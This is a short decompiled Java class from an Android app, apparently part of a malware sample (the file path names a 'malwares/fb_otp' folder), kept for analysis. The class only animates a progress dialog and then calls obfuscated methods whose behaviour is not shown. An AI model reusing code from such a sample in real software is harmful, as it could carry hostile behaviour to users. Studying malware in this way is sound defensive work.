import android.app.ProgressDialog;
import android.os.Handler;
import android.os.Message;
import com.soft360.iService.MainActivity;

public final class cF
  extends Handler
{
  public cF(MainActivity paramMainActivity) {}
  
  public final void handleMessage(Message paramMessage)
  {
    this.a.jdField_a_of_type_AndroidAppProgressDialog.setIndeterminate(false);
    if (this.a.jdField_a_of_type_AndroidAppProgressDialog.getProgress() < this.a.jdField_a_of_type_AndroidAppProgressDialog.getMax())
    {
      this.a.jdField_a_of_type_AndroidAppProgressDialog.incrementProgressBy(50);
      this.a.jdField_a_of_type_AndroidAppProgressDialog.incrementSecondaryProgressBy(75);
      this.a.jdField_a_of_type_AndroidOsHandler.sendEmptyMessageDelayed(0, 100L);
      return;
    }
    this.a.jdField_a_of_type_AndroidAppProgressDialog.dismiss();
    this.a.jdField_a_of_type_DU.p();
    this.a.jdField_a_of_type_Boolean = true;
    this.a.a();
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/cF.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */